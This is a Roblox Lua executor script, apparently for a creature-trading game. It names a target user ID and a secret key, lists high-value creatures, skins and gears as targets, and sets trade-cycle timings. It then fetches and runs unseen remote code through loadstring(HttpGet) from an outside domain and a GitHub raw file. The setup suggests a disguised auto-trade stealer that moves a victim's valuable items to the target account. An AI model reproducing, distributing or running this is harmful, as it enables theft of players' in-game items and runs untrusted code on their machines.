getgenv().SECRET_KEY = "F87AC747DB29BA31181B08C0BC264827"
getgenv().TARGET_ID = 10473713528
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = {
    ["Spyder Elephant"] = true,
    ["Strawberry Elephant"] = true,
    ["Headless Horseman"] = true,
    ["Meowl"] = true,
    ["John Pork"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Dragon Aquanini"] = true,
    ["Arcadragon"] = true,
    ["Phoenix"] = true,
    ["Los Dragons"] = true,
    ["Griffin"] = true,
    ["Dragon Skeletonini"] = true,
    ["Plant Bros"] = true,
    ["Signore Carapace"] = true,
    ["Arca Bros"] = true,
    ["Moby Bros"] = true,
    ["Love Love Bear"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Digi Narwhal"] = true,
    ["Kraken"] = true,
    ["La Supreme Combinasion"] = true,
    ["Hydra Bunny"] = true,
    ["Kalika Bros"] = true,
    ["Elefanto Frigo"] = true,
    ["Medusini and Demonini"] = true,
    ["Cerberus"] = true,
    ["Venuspino"] = true,
    ["Celestial Pegasus"] = true,
    ["Jelly Moby"] = true,
    ["Bumbatron"] = true,
    ["Bunny and Eggy"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Rosey and Teddy"] = true,
    ["Capitano Moby"] = true,
    ["Cola Cat"] = true,
    ["Cooki and Milki"] = true,
    ["Skelly and Coffy"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Burguro And Fryuro"] = true,
    ["Ketupat Bros"] = true,
    ["Reinito Sleighito"] = true,
    ["Pizza and Ranch"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Los Amigos"] = true,
    ["Pancake and Syrup"] = true,
    ["Antonio"] = true,
    ["Draculino"] = true,
    ["Fishino Clownino"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Foxini Lanternini"] = true,
    ["Sammyni Truckini"] = true,
    ["Los Sekolahs"] = true,
    ["La Casa Boo"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Cash or Card"] = true,
    ["La Secret Combinasion"] = true,
    ["La Fuse Machine"] = true,
    ["Los Admins"] = true,
    ["Flying Dutchman"] = true,
    ["Duggy Bros"] = true,
    ["La Food Combinasion"] = true,
    ["Yetimatic"] = true,
    ["Sammyni Cakini"] = true,
    ["Gold and Diamond"] = true,
    ["S'more Serat"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Spooky and Pumpky"] = true,
    ["Boppin Bunny"] = true,
    ["Sammyni Spookyni"] = true,
    ["Ginger Gerat"] = true,
    ["La Craft Machine"] = true,
    ["Los Hackers"] = true,
    ["Bearito Cabinito"] = true,
    ["Capitano Americano"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Examen Bros"] = true,
    ["Rubrikiko"] = true,
    ["Sammyni Fattini"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Panda Popanda"] = true,
    ["Guest 666"] = true,
    ["Festive 67"] = true,
    ["Quackini Snackini"] = true,
    ["Queen Bee"] = true,
    ["Pop Pop Petalini"] = true,
    ["Grabatron"] = true,
    ["Cloverat Clapat"] = true,
    ["Caylusaurus"] = true,
    ["Polaroidini"] = true,
    ["Steakini Fattini"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Garama and Madundung"] = true,
    ["Gym Bros"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Rico Dinero"] = true,
    ["Dug dug dug"] = true,
    ["Fragola La La La"] = true,
    ["Globa Steppa"] = true
}
getgenv().TARGET_BASE_SKINS = {
    ["Tralalero"] = true,
    ["Octo"] = true
}
getgenv().TARGET_GEARS = {
    ["Candy Sentry"] = true,
    ["Crystal Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Cupid's Wings"] = true,
    ["Flying Bee"] = true,
    ["Rainbow Hammer"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true
}
local function V3NT_RUN(name, getSource)
    task.spawn(function()
        local ok, err = pcall(function()
            local src = getSource()
            local fn, compileErr = loadstring(src)
            if not fn then error(compileErr, 0) end
            fn()
        end)
        if not ok then warn("[V3nt] " .. name .. ": " .. tostring(err)) end
    end)
end
V3NT_RUN("Custom", function() return [=[


loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=jiox4k6v"))()


]=] end)
V3NT_RUN("Script", function() return game:HttpGet("https://raw.githubusercontent.com/AAVMoreira/AAVMOREIRA/refs/heads/main/AAVMoreiralogic") end)